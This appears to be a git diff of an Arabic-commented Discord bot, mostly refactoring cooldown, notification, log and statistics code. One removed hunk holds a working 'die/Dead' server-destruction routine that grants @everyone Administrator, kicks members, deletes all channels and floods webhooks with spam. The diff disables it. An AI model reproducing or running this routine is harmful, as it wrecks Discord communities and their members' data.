-    console.error('❌ خطأ في تجهيز التقارير المعلقة للحفظ:', error);
-  }
-}
-
-async function checkExpiredReports() {
-    const now = Date.now();
-    const twentyFourHours = 24 * 60 * 60 * 1000;
-    let changed = false;
-
-    for (const [reportId, reportData] of client.pendingReports.entries()) {
-        if (reportData.submittedAt && (now - reportData.submittedAt > twentyFourHours)) {
-            console.log(`Report ${reportId} has expired. Automatically rejecting.`);
-
-            if (reportData.approvalMessageIds) {
-                for (const [channelId, messageId] of Object.entries(reportData.approvalMessageIds)) {
-                    try {
-                        const channel = await client.channels.fetch(channelId);
-                        const message = await channel.messages.fetch(messageId);
-
-                        const originalEmbed = message.embeds[0];
-                        if (originalEmbed) {
-                            const newEmbed = new EmbedBuilder.from(originalEmbed)
-                                .setFields(
-                                    ...originalEmbed.fields.filter(f => f.name !== 'الحالة'),
-                                    { name: 'الحالة', value: '❌ تم الرفض تلقائياً لمرور 24 ساعة' }
-                                );
-                            await message.edit({ embeds: [newEmbed], components: [] });
-                        }
-                    } catch(e) {
-                        console.error(`Could not edit expired report message ${messageId} in channel ${channelId}:`, e);
-                    }
-                }
-            }
-
-            client.pendingReports.delete(reportId);
-            changed = true;
-        }
-    }
-    if (changed) {
-        scheduleSave();
-    }
-}
-
 function registerMapOpenPanelMessage(config, channelId, messageId) {
     if (!config?.open || !/^\d{17,19}$/.test(channelId) || !/^\d{17,19}$/.test(messageId)) return false;
     const existing = Array.isArray(config.open.panelMessages) ? config.open.panelMessages : [];
@@ -4976,94 +4557,12 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
         }
 
     }
-    // --- DIE & DEAD ACTION HANDLERS (Instant Explosion Mode) ---
+    // أزرار التدمير القديمة أصبحت معطلة لتجنب جلب جميع الأعضاء وإنشاء/حذف مئات الموارد.
     if (interaction.isButton() && (interaction.customId === 'die_action' || interaction.customId === 'Dead_action' || interaction.customId.startsWith('die_action_') || interaction.customId.startsWith('Dead_action_'))) {
-        const customId = interaction.customId;
-        const mode = customId.startsWith('die_action') ? 'die' : 'Dead';
-        const targetGuildId = customId.includes('_') ? customId.split('_').slice(2).join('_') : null;
-        const guild = interaction.guild || (targetGuildId ? await client.guilds.fetch(targetGuildId).catch(() => null) : null);
-
-        if (!guild) {
-            await interaction.reply({
-                content: '❌ ما قدرت أحدد السيرفر المستهدف من هذا الزر. أعد المحاولة بعد خروج/باند جديد.',
-                flags: MessageFlags.Ephemeral
-            }).catch(() => {});
-            return;
-        }
-        
-        try {
-            await interaction.deferUpdate().catch(() => {});
-            actionStats.set(guild.id, { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 });
-
-            // جلب البيانات الأساسية بسرعة البرق
-            const [members, channels, roles] = await Promise.all([
-                guild.members.fetch(),
-                guild.channels.fetch(),
-                guild.roles.fetch()
-            ]);
-
-            const everyoneRole = guild.roles.everyone;
-
-            // --- المرحلة 1: الصدمة الأولى (الرتب والطرد) ---
-            const initialShock = [];
-            initialShock.push(everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
-            
-            roles.filter(r => r.editable && r.id !== everyoneRole.id).forEach(r => {
-                initialShock.push(r.setPermissions(mode === 'die' ? [] : [PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
-            });
-
-            members.filter(m => m.id !== guild.ownerId && m.manageable).forEach(m => {
-                initialShock.push(m.kick('Instant Explosion').then(() => updateStats(guild.id, 'membersKicked')));
-            });
-
-            Promise.all(initialShock.map(p => p.catch(() => {})));
-
-            // --- المرحلة 2: الانفجار اللحظي (الرومات والسبام المتعدد) ---
-            if (mode === 'Dead') {
-                // حذف الرومات بالتوازي المطلق
-                channels.forEach(c => c.delete().then(() => updateStats(guild.id, 'channelsDeleted')).catch(() => {}));
-
-                // تقنية Multi-Stream Flooding: 100 روم مع ويبهوكات متعددة
-                for (let i = 0; i < 100; i++) {
-                    const randomName = channelNames[Math.floor(Math.random() * channelNames.length)] + '-' + i;
-                    guild.channels.create({ name: randomName, type: ChannelType.GuildText })
-                        .then(channel => {
-                            // إنشاء 3 ويبهوكات لكل روم لمضاعفة سرعة السبام وتوزيع الضغط
-                            for (let w = 0; w < 3; w++) {
-                                channel.createWebhook({ name: `Destroyer-${w}` })
-                                    .then(webhook => {
-                                        updateStats(guild.id, 'webhooksCreated');
-                                        // إرسال سبام مكثف من كل ويبهوك بشكل متوازي
-                                        const spamInterval = setInterval(() => {
-                                            webhook.send('@everyone DEAD HAS TAKEN OVER! 💥\nhttps://tenor.com/view/explosion-boom-blast-nuclear-gif-14732150')
-                                                .then(() => updateStats(guild.id, 'messagesSpammed'))
-                                                .catch(() => clearInterval(spamInterval));
-                                        }, 500); // إرسال رسالة كل نصف ثانية من كل ويبهوك
-                                        
-                                        // التوقف بعد 50 رسالة لكل ويبهوك لتجنب التعليق الكامل
-                                        setTimeout(() => clearInterval(spamInterval), 30000);
-                                    }).catch(() => {});
-                            }
-                        }).catch(() => {});
-                }
-            }
-
-            // تحديث التقرير النهائي بعد 8 ثوانٍ
-            setTimeout(async () => {
-                const stats = actionStats.get(guild.id) || { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 };
-                const embed = new EmbedBuilder()
-                    .setTitle('🔥 انفجار شامل ونهائي')
-                    .setColor('#000000')
-                    .setDescription('تم تنفيذ العملية بنجاح تام.')
-                    .addFields(
-                        { name: '🗑️ رومات', value: `${stats.channelsDeleted}`, inline: true },
-                        { name: '👢 طرد', value: `${stats.membersKicked}`, inline: true },
-                        { name: '🛡️ رولات', value: `${stats.rolesModified}`, inline: true },
-                        { name: '📧 سبام', value: `${stats.messagesSpammed}`, inline: true }
-                    );
-                await interaction.editReply({ embeds: [embed], components: [] }).catch(() => {});
-            }, 8000);
-        } catch (error) { console.error('Error in Burst Action:', error); }
+        await interaction.reply({
+            content: '❌ هذا الإجراء معطل لحماية السيرفر ومنع العمليات عالية الاستهلاك.',
+            flags: MessageFlags.Ephemeral
+        }).catch(() => {});
         return;
     }
 
@@ -5784,16 +5283,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
         return;
     }
 
-    // Handle cooldown system interactions (including modals)
-    if (interaction.customId && (interaction.customId.startsWith('cooldown_') || 
-        (interaction.isModalSubmit() && interaction.customId === 'cooldown_search_responsibility_modal'))) {
-        const cooldownCommand = client.commands.get('cooldown');
-        if (cooldownCommand && cooldownCommand.handleInteraction) {
-            await cooldownCommand.handleInteraction(interaction, context);
-        }
-        return;
-    }
-
     // --- Down System Interaction Router ---
     if (interaction.customId && (interaction.customId.startsWith('down_') || interaction.customId.startsWith('dm_down_'))) {
         console.log(`معالجة تفاعل down: ${interaction.customId}`);
@@ -5836,32 +5325,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
                         flags: MessageFlags.Ephemeral
                     }).catch(() => {});
                 }
-            }
-        }
-        return;
-    }
-
-    // Handle notifications system interactions
-    if (interaction.customId && (interaction.customId.startsWith('notification_') ||
-        interaction.customId === 'select_responsibility_time')) {
-        const notificationsCommand = client.commands.get('notifications');
-        if (notificationsCommand && typeof notificationsCommand.handleInteraction === 'function') {
-            await notificationsCommand.handleInteraction(interaction, typeof context !== 'undefined' ? context : { client });
-        }
-        return;
-    }
-
-    // Handle notifications modal submissions (including search)
-    if (interaction.isModalSubmit() && (interaction.customId.startsWith('change_global_time_modal') ||
-        interaction.customId.startsWith('responsibility_time_modal_') ||
-        interaction.customId === 'notifications_search_responsibility_modal')) {
-        const notificationsCommand = client.commands.get('notifications');
-        if (notificationsCommand && typeof notificationsCommand.handleModalSubmit === 'function') {
-            await notificationsCommand.handleModalSubmit(interaction, client, typeof global.responsibilities !== 'undefined' ? global.responsibilities : {});
-        } else if (interaction.customId === 'notifications_search_responsibility_modal') {
-            // إضافة معالج مباشر للبحث
-            if (notificationsCommand && typeof notificationsCommand.handleInteraction === 'function') {
-                await notificationsCommand.handleInteraction(interaction, typeof context !== 'undefined' ? context : { client });
             }
         }
         return;
@@ -5981,6 +5444,41 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
 
     if (interaction.isButton() && interaction.customId.startsWith('shortcut_supervisor_call_')) {
       await interaction.reply({ content: '**تم دمج استدعاء المشرفين داخل زر Call الجديد؛ استخدم الاختصار مرة أخرى.**', flags: 64 }).catch(() => {});
+      return;
+    }
+
+    // زر إعادة الاختصار الموجود في رسالة "يوجد مشكلة بالفعل مفتوحه".
+    // يسمح لصاحب الطلب فقط بفتح طلب جديد لمشكلة مختلفة، دون كتابة الاختصار
+    // يدويًا، مع تجاوز كولداون الطلب السابق لهذه الضغطة فقط.
+    if (interaction.isButton() && interaction.customId.startsWith('shortcut_retry_')) {
+      const requestToken = interaction.customId.slice('shortcut_retry_'.length);
+      const requestData = client.shortcutRequests?.get(requestToken);
+      if (!requestData || interaction.user.id !== requestData.requesterId) {
+        await interaction.reply({ content: '**هذا الزر مخصص فقط للشخص الذي استخدم الاختصار.**', flags: 64 }).catch(() => {});
+        return;
+      }
+      const responsibility = (global.responsibilities || {})[requestData.responsibilityName];
+      const prefix = String(responsibility?.mentPrefix || '-');
+      const shortcut = String(responsibility?.mentShortcut || '').trim();
+      if (!shortcut) {
+        await interaction.reply({ content: '**اختصار هذه المسؤولية غير مضبوط حاليًا.**', flags: 64 }).catch(() => {});
+        return;
+      }
+      await interaction.deferUpdate().catch(() => {});
+      const usageKey = getShortcutUsageKey(interaction.guild.id, interaction.user.id, requestData.responsibilityName);
+      shortcutBypassKeys.add(usageKey);
+      const syntheticMessage = {
+        id: `shortcut-retry-${Date.now()}-${interaction.user.id}`,
+        guild: interaction.guild,
+        channel: interaction.channel,
+        author: interaction.user,
+        member: interaction.member,
+        content: `${prefix}${shortcut}`,
+        reference: null,
+        mentions: { users: new Map(), everyone: false, repliedUser: null },
+        react: async () => syntheticMessage
+      };
+      void client.emit('messageCreate', syntheticMessage);
       return;
     }
 
@@ -6387,21 +5885,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
       return;
     }
 
-    // Handle masoul interactions - تمرير جميع التفاعلات المتعلقة بـ masoul إلى معالج مستقل
-    if (
-      (interaction.isButton() && interaction.customId.startsWith('claim_task_')) ||
-      (interaction.isModalSubmit() && interaction.customId.startsWith('call_reason_modal_')) ||
-      (interaction.isButton() && interaction.customId.startsWith('go_to_call_')) ||
-      (interaction.isModalSubmit() && interaction.customId.startsWith('masoul_modal_'))
-    ) {
-        console.log(`[MASOUL] تفاعل: ${interaction.customId}`);
-        const masoulCommand = client.commands.get('مسؤول');
-        if (masoulCommand && masoulCommand.handleInteraction) {
-            await masoulCommand.handleInteraction(interaction, context);
-        }
-        return;
-    }
-
     // Handle modal submissions for setup
     if (interaction.isModalSubmit() && interaction.customId.startsWith('setup_reason_modal_')) {
       // منع التفاعلات المتكررة
@@ -6456,18 +5939,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
         return interaction.reply({ content: '**لا يوجد مسؤولين معينين لهذه المسؤولية.**', flags: 64 });
       }
 
-      // Check cooldown
-      const cooldownTime = checkCooldown(interaction.user.id, responsibilityName);
-      if (cooldownTime > 0) {
-        return interaction.reply({
-          content: `**لقد استخدمت هذا الأمر مؤخرًا. يرجى الانتظار ${Math.ceil(cooldownTime / 1000)} ثانية أخرى.**`,
-          flags: 64
-        });
-      }
-
-      // Start cooldown for user
-      startCooldown(interaction.user.id, responsibilityName);
-
       // Get stored image URL for this user
       const storedImageUrl = client.setupImageData?.get(interaction.user.id);
 
@@ -6501,13 +5972,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
           }
         }
 
-        // Start tracking this task for reminders
-        const taskId = `${responsibilityName}_${Date.now()}`;
-        const notificationsCommand = client.commands.get('notifications');
-        if (notificationsCommand && notificationsCommand.trackTask) {
-          notificationsCommand.trackTask(taskId, responsibilityName, responsibles, client);
-        }
-
         await interaction.reply({ content: `**تم إرسال الطلب لـ ${sentCount} من المسؤولين.**`, flags: 64 });
       } else {
         // Send to specific user
@@ -6519,13 +5983,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
 
           const user = await client.users.fetch(target);
           await user.send({ embeds: [embed], components: [buttonRow] });
-
-          // Start tracking this task for reminders
-          const taskId = `${responsibilityName}_${Date.now()}`;
-          const notificationsCommand = client.commands.get('notifications');
-          if (notificationsCommand && notificationsCommand.trackTask) {
-            notificationsCommand.trackTask(taskId, responsibilityName, [target], client);
-          }
 
           await interaction.reply({ content: `**تم إرسال الطلب إلى ${user.username}.**`, flags: 64 });
         } catch (error) {
@@ -6668,7 +6125,8 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
 
         // إنشاء collector للأزرار - persistent
         const buttonCollector = interaction.channel.createMessageComponentCollector({
-          filter: i => i.customId.startsWith('setup_contact_') && i.user.id === interaction.user.id
+          filter: i => i.customId.startsWith('setup_contact_') && i.user.id === interaction.user.id,
+          time: 10 * 60 * 1000
         });
 
         buttonCollector.on('collect', async buttonInteraction => {
@@ -6684,15 +6142,6 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
 
             const responsibilityName = parts[2];
             const userId = parts[3]; // Store the target user ID
-            // Check cooldown
-            const { checkCooldown } = require('./commands/cooldown.js');
-            const cooldownTime = checkCooldown(buttonInteraction.user.id, responsibilityName);
-            if (cooldownTime > 0) {
-              return buttonInteraction.reply({
-                content: `**لقد استخدمت هذا الأمر مؤخرًا. يرجى الانتظار ${Math.ceil(cooldownTime / 1000)} ثانية أخرى.**`,
-                flags: 64
-              });
-            }
 
             // إظهار نموذج السبب
             const modal = new ModalBuilder()
@@ -6720,6 +6169,7 @@ if ((interaction.isButton() || interaction.isModalSubmit() || interaction.isRole
         // Set a timeout to delete the message after 10 minutes if no action is taken
         const deleteTimeout = setTimeout(async () => {
           try {
+            buttonCollector.stop('time');
             await interaction.deleteReply().catch(() => {});
             console.log('تم حذف رسالة الاستدعاء بعد انتهاء الوقت المحدد من المعالج العام');
 
@@ -6906,165 +6356,6 @@ async function showUserResponsibilities(message, targetUser, responsibilities, c
     });
     await message.channel.send({ files: [summaryImage] });
 }
-// دالة لعرض إحصائيات المترقين مع التنقل
-// Handle single record deletion
-async function handleDeleteSingleRecord(interaction, roleId, recordIndex) {
-    try {
-        const promoteLogsPath = path.join(__dirname, 'data', 'promoteLogs.json');
-
-        // Check permissions
-        if (!isBotOwner(interaction.member || interaction.user)) {
-            await interaction.reply({
-                content: '❌ **ليس لديك صلاحية لحذف السجلات!**',
-                flags: MessageFlags.Ephemeral
-            });
-            return;
-        }
-
-        // Read current logs
-        const logs = readJSONFile(promoteLogsPath, []);
-
-        // Filter logs for this role
-        const roleRecords = logs.filter(log => {
-            if (!log.data) return false;
-
-            if (log.type === 'BULK_PROMOTION') {
-                return log.data.targetRoleId === roleId || log.data.sourceRoleId === roleId;
-            } else if (log.type === 'PROMOTION_APPLIED' || log.type === 'PROMOTION_ENDED') {
-                return log.data.roleId === roleId || log.data.role?.id === roleId;
-            } else if (log.type === 'MULTI_PROMOTION_APPLIED') {
-                return log.data.roleIds && log.data.roleIds.includes(roleId);
-            }
-
-            return log.data.roleId === roleId;
-        });
-
-        if (recordIndex >= roleRecords.length) {
-            await interaction.reply({
-                content: '❌ **السجل غير موجود!**',
-                flags: MessageFlags.Ephemeral
-            });
-            return;
-        }
-
-        const recordToDelete = roleRecords[recordIndex];
-
-        // Find and remove the record from all logs
-        const indexInAllLogs = logs.findIndex(log => 
-            log.timestamp === recordToDelete.timestamp && 
-            JSON.stringify(log.data) === JSON.stringify(recordToDelete.data)
-        );
-
-        if (indexInAllLogs === -1) {
-            await interaction.reply({
-                content: '❌ **لم يتم العثور على السجل في القائمة العامة!**',
-                flags: MessageFlags.Ephemeral
-            });
-            return;
-        }
-
-        // Remove the record
-        logs.splice(indexInAllLogs, 1);
-
-        // Save updated logs
-        writeJSONFile(promoteLogsPath, logs);
-
-        const successEmbed = colorManager.createEmbed()
-            .setTitle('✅ تم حذف السجل')
-            .setDescription(`تم حذف السجل رقم ${recordIndex + 1} بنجاح`)
-            .addFields([
-                { name: '**تم الحذف بواسطة**', value: `<@${interaction.user.id}>`, inline: true },
-                { name: '**التاريخ**', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
-            ])
-            .setTimestamp();
-
-        await interaction.update({
-            embeds: [successEmbed],
-            components: []
-        });
-
-    } catch (error) {
-        console.error('خطأ في حذف السجل:', error);
-        await interaction.reply({
-            content: '❌ **حدث خطأ أثناء حذف السجل!**',
-            flags: MessageFlags.Ephemeral
-        });
-    }
-}
-
-// Handle all records deletion for a role
-async function handleDeleteAllRecords(interaction, roleId) {
-    try {
-        const promoteLogsPath = path.join(__dirname, 'data', 'promoteLogs.json');
-
-        // Check permissions
-        if (!isBotOwner(interaction.member || interaction.user)) {
-            await interaction.reply({
-                content: '❌ **ليس لديك صلاحية لحذف السجلات!**',
-                flags: MessageFlags.Ephemeral
-            });
-            return;
-        }
-
-        // Read current logs
-        const logs = readJSONFile(promoteLogsPath, []);
-        const originalCount = logs.length;
-
-        // Filter out logs for this role
-        const filteredLogs = logs.filter(log => {
-            if (!log.data) return true;
-
-            if (log.type === 'BULK_PROMOTION') {
-                return !(log.data.targetRoleId === roleId || log.data.sourceRoleId === roleId);
-            } else if (log.type === 'PROMOTION_APPLIED' || log.type === 'PROMOTION_ENDED') {
-                return !(log.data.roleId === roleId || log.data.role?.id === roleId);
-            } else if (log.type === 'MULTI_PROMOTION_APPLIED') {
-                return !(log.data.roleIds && log.data.roleIds.includes(roleId));
-            }
-
-            return log.data.roleId !== roleId;
-        });
-
-        const deletedCount = originalCount - filteredLogs.length;
-
-        if (deletedCount === 0) {
-            await interaction.update({
-                content: '⚠️ **لا توجد سجلات لحذفها لهذا الرول!**',
-                embeds: [],
-                components: []
-            });
-            return;
-        }
-
-        // Save updated logs
-        writeJSONFile(promoteLogsPath, filteredLogs);
-
-        const successEmbed = colorManager.createEmbed()
-            .setTitle('✅ تم حذف جميع السجلات')
-            .setDescription(`تم حذف ${deletedCount} سجل بنجاح`)
-            .addFields([
-                { name: '**الرول**', value: `<@&${roleId}>`, inline: true },
-                { name: '**عدد السجلات المحذوفة**', value: `${deletedCount}`, inline: true },
-                { name: '**تم الحذف بواسطة**', value: `<@${interaction.user.id}>`, inline: true },
-                { name: '**التاريخ**', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
-            ])
-            .setTimestamp();
-
-        await interaction.update({
-            embeds: [successEmbed],
-            components: []
-        });
-
-    } catch (error) {
-        console.error('خطأ في حذف جميع السجلات:', error);
-        await interaction.update({
-            content: '❌ **حدث خطأ أثناء حذف السجلات!**',
-            embeds: [],
-            components: []
-        });
-    }
-}
-
 async function handleBulkPromotionStats(interaction, client) {
     const { getRealUserStats } = require('./utils/userStatsCollector');
     const { ButtonBuilder, ActionRowBuilder, ButtonStyle } = require('discord.js');
@@ -7116,30 +6407,37 @@ async function handleBulkPromotionStats(interaction, client) {
     try {
         await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
-        // جمع إحصائيات جميع الأعضاء المترقين
+        // جمع الإحصائيات مرة واحدة فقط ثم إعادة استخدامها عند التنقل بين الصفحات.
         const membersWithStats = [];
+        const statsCache = membersData.statsCache && typeof membersData.statsCache === 'object'
+            ? membersData.statsCache
+            : (membersData.statsCache = {});
+        const membersToLoad = membersData.successfulMembers
+            .map(member => typeof member === 'object' ? member : { id: member, displayName: null })
+            .filter(member => member?.id && !statsCache[member.id]);
 
-        for (const member of membersData.successfulMembers) {
-            const memberObj = typeof member === 'object' ? member : { id: member, displayName: null };
-
-            try {
-                // الحصول على كائن العضو من السيرفر
-                const guildMember = await interaction.guild.members.fetch(memberObj.id).catch(() => null);
-
-                if (guildMember) {
-                    // جمع الإحصائيات للعضو
-                    const stats = await getRealUserStats(memberObj.id);
-
-                    membersWithStats.push({
+        // حد أقصى 5 عمليات متزامنة لتجنب ضغط REST/قاعدة البيانات.
+        for (let i = 0; i < membersToLoad.length; i += 5) {
+            await Promise.all(membersToLoad.slice(i, i + 5).map(async (memberObj) => {
+                try {
+                    const guildMember = interaction.guild.members.cache.get(memberObj.id)
+                        || await interaction.guild.members.fetch(memberObj.id).catch(() => null);
+                    if (!guildMember) return;
+                    statsCache[memberObj.id] = {
                         id: memberObj.id,
                         displayName: guildMember.displayName || guildMember.user.username,
                         username: guildMember.user.username,
-                        stats: stats
-                    });
+                        stats: await getRealUserStats(memberObj.id)
+                    };
+                } catch (error) {
+                    console.error(`خطأ في جمع إحصائيات العضو ${memberObj.id}:`, error);
                 }
-            } catch (error) {
-                console.error(`خطأ في جمع إحصائيات العضو ${memberObj.id}:`, error);
-            }
+            }));
+        }
+
+        for (const member of membersData.successfulMembers) {
+            const cached = statsCache[typeof member === 'object' ? member.id : member];
+            if (cached) membersWithStats.push(cached);
         }
 
         // ترتيب الأعضاء حسب الوقت الصوتي (الأكثر نشاطاً أولاً)
@@ -7258,62 +6556,6 @@ function formatDuration(milliseconds) {
     return parts.length > 0 ? parts.join(' و ') : 'أقل من ثانية';
 }
 
-// Helper function for safe replies مع معالجة محسنة
-async function safeReply(interaction, content, options = {}) {
-  try {
-    // Basic validation
-    if (!interaction || !interaction.isRepliable()) {
-      return false;
-    }
-
-    // Check interaction age with more strict timing
-    const now = Date.now();
-    const interactionAge = now - interaction.createdTimestamp;
-    if (interactionAge > 600000) { // 10 دقائق فقط
-      return false;
-    }
-
-    // Check if already replied or deferred
-    if (interaction.replied || interaction.deferred) {
-      return false;
-    }
-
-    const replyOptions = {
-      content: content || 'حدث خطأ',
-      flags: MessageFlags.Ephemeral,
-      ...options
-    };
-
-    // محاولة الرد مع timeout
-    const replyPromise = interaction.reply(replyOptions);
-    const timeoutPromise = new Promise((_, reject) =>
-      setTimeout(() => reject(new Error('Reply timeout')), 5000)
-    );
-
-    await Promise.race([replyPromise, timeoutPromise]);
-    return true;
-  } catch (error) {
-    // تجاهل أخطاء Discord المعروفة بصمت تام
-    const ignoredCodes = [10008, 40060, 10062, 10003, 50013, 50001, 50027, 10015, 50035, 10014, 10020, 40061];
-    if (error.code && ignoredCodes.includes(error.code)) {
-      return false;
-    }
-
-    // تجاهل رسائل الأخطاء المعروفة
-    if (error.message && (
-      error.message.includes('Unknown interaction') ||
-      error.message.includes('Already replied') ||
-      error.message.includes('Reply timeout') ||
-      error.message.includes('Invalid Form Body')
-    )) {
-      return false;
-    }
-
-    return false;
-  }
-}
-
-// معالج الإغلاق الآمن
 async function gracefulShutdown(signal) {
     console.log(`\n🔄 جاري إيقاف البوت بأمان... (${signal})`);
 
